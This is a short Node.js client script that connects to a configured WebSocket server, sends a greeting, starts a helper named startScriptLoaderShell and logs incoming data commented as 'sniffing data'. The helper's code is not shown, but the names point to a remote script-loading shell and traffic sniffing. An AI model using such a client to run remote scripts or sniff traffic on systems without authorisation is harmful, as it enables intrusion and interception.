const WebSocket = require('ws')

const config = require('./config')
const { startScriptLoaderShell } = require('./utils')

const ws = new WebSocket(config.serverURI)

ws.on('open', async () => {
  ws.send('hello')
  startScriptLoaderShell(ws)
})

ws.on('message', data => {
  // Log sniffing data
  console.log(data)
})

